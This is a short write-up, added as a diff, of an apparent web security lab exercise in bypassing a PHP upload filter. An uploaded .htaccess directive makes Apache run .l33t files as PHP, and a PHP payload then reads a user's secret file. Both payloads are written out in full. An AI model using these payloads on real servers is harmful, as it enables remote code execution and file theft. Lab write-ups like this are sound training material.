@@ -1,0 +1,33 @@
+**Objective:** Bypass the `.php` file upload filter and execute code on the server.
+
+**Vulnerability:** File Upload + `.htaccess` bypass.
+
+**Steps taken:**
+1. Uploaded a standard image as an avatar.
+2. Intercepted the `POST /my-account/avatar` request in Burp.
+3. Attempted to upload `exploit.php` — the server blocked it (the `.php` extension is prohibited).
+4. Uploaded an `.htaccess` file containing the following directive:
+AddType application/x-httpd-php .l33t
+
+This instructs Apache to execute files with the `.l33t` extension as PHP.
+
+5. Uploaded `exploit.l33t` containing PHP code:
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+Accessed `/files/avatars/exploit.l33t` — the PHP code was executed, and I retrieved Carlos's secret.
+
+
+Payload:
+
+.htaccess:
+AddType application/x-httpd-php .l33t
+exploit.l33t:
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+Why it worked:
+
+The site blocks `.php` files but allows `.htaccess` files.
+
+The `.htaccess` file configures Apache to process `.l33t` files as PHP.
+
+The server executes `exploit.l33t` as PHP code.
